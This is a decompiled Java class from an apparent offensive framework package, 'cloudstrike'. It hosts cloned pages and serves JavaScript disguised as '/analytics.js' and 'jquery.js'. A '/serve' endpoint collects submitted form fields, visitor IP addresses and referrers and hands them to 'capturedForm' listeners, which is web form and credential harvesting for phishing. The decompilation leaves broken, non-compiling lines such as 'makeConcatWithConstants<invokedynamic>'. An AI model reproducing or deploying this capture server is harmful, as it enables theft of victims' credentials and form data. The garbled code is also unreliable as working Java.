package cloudstrike;

import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import profiler.SystemProfiler;

public class CaptureContent implements WebService {
   protected String content;
   protected String type;
   protected String desc;
   protected String proto = "";
   protected List listeners = new LinkedList();

   public void addCaptureListener(CaptureContent.CaptureListener l) {
      this.listeners.add(l);
   }

   public CaptureContent(String content, String type, String desc) {
      this.content = content;
      this.type = type;
      this.desc = desc;
   }

   public void setup(WebServer w, String uri) {
      w.register(uri, this);
      w.registerSecondary("/analytics.js", this);
      w.registerSecondary("/serve", this);
      w.registerSecondary("/jquery.js", this);
      if (w.isSSL()) {
         this.proto = "https://";
      } else {
         this.proto = "http://";
      }

   }

   public String resource(String resource, String url) {
      StringBuffer temp = new StringBuffer(524288);

      try {
         SystemProfiler.suckItDown(resource, temp);
      } catch (Exception var5) {
         WebServer.logException("Could not get " + resource, var5, false);
      }

      return temp.toString().replace("%URL%", url);
   }

   public Response serve(String uri, String method, Properties header, Properties param) {
      String var10006;
      if (uri.equals("/analytics.js")) {
         var10006 = this.proto;
         return new Response("200 OK", "text/javascript", this.resource("/resources/analytics.js", var10006 + header.get("Host")));
      } else if (uri.equals("/jquery.js")) {
         var10006 = this.proto;
         return new Response("200 OK", "text/javascript", this.resource("/resources/jquery-1.7.1.min.js", var10006 + header.get("Host")));
      } else if (!uri.equals("/serve")) {
         return new Response("200 OK", this.type, this.content);
      } else {
         Iterator i = this.listeners.iterator();
         String who = ((Class)header.get("REMOTE_ADDRESS")).makeConcatWithConstants<invokedynamic>(header.get("REMOTE_ADDRESS"));
         String from = ((Class)header.get("Referer")).makeConcatWithConstants<invokedynamic>(header.get("Referer"));
         if (who.length() > 1) {
            who = who.substring(1);
         }

         CaptureContent.CaptureListener l = null;

         while(i.hasNext()) {
            try {
               l = (CaptureContent.CaptureListener)i.next();
               l.capturedForm(from, who, param, ((Class)param.get("id")).makeConcatWithConstants<invokedynamic>(param.get("id")));
            } catch (Exception var10) {
               WebServer.logException("Listener: " + l + " vs. " + from + ", " + who + ", " + param, var10, false);
            }
         }

         return new Response("200 OK", "text/plain", "");
      }
   }

   public String toString() {
      return this.desc;
   }

   public String getType() {
      return "page";
   }

   public List cleanupJobs() {
      return new LinkedList();
   }

   public boolean suppressEvent(String uri) {
      return false;
   }

   public boolean isFuzzy() {
      return false;
   }

   public interface CaptureListener {
      void capturedForm(String var1, String var2, Map var3, String var4);
   }
}
